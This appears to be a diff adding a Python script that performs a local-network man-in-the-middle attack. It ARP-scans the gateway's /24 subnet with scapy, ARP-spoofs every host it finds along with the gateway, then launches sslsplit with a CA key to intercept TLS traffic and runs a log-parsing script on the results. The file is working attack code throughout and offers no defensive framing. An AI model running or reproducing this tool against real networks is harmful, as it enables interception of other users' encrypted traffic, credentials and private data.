@@ -1,0 +1,58 @@
+#!/usr/bin/env python3
+from scapy.all import ARP, Ether, srp, send
+import subprocess
+import netifaces
+from time import sleep
+
+def scan_MAC_address(target_ip):
+    arp = ARP(pdst=target_ip)
+    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
+    packet = ether/arp
+
+    result = srp(packet, timeout=3, verbose=False)[0]
+    clients = {}
+
+    for sent, received in result:
+        clients[received.psrc]= received.hwsrc
+
+    print("Available devices:")
+    print('-'*37)
+    print("IP" + " "*18+"MAC")
+    print('-'*37)
+    for ip, mac in clients.items():
+        print(f"{ip:16}    {mac}")
+
+    return clients
+
+def ARP_spoofing(target_ip, target_mac, spoof_ip):
+    ''' send a packet that modifies the ARP table of the target machine '''
+    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    send(packet, verbose=False)
+
+def SSL_split():
+    # TODO:
+    # 	sudo sslsplit -k ca.key -c ca.crt -l connect.log -L tmp.log ssl 0.0.0.0 8443
+    cmd = "sudo sslsplit -k ca.key -c ca.crt -l connect.log -L tmp.log ssl 0.0.0.0 8443"
+    subprocess.Popen(cmd, shell=True, encoding="utf-8")
+    # execute parse_log(shell script)
+    sleep(30)
+    subprocess.call(['./parse_log'])
+
+def main():
+    # ex:
+    # target_ip = '10.0.2.4'
+    # gateway_ip = '10.0.2.1'
+    gateway_ip = netifaces.gateways()[netifaces.AF_INET][0][0]
+    scan_ip = gateway_ip + "/24"
+    # scan_ip = "10.0.2.1/24"
+    # "192.168.1.1/24" is a range from "192.168.1.0" to "192.168.1.255"
+    clients = scan_MAC_address(scan_ip)
+    for target_ip in clients:
+        if target_ip != gateway_ip:
+            ARP_spoofing(target_ip, clients[target_ip], gateway_ip)
+            ARP_spoofing(gateway_ip, clients[gateway_ip], target_ip)
+    print("ARP spoofing done")
+    SSL_split()
+
+if __name__ == '__main__':
+    main()
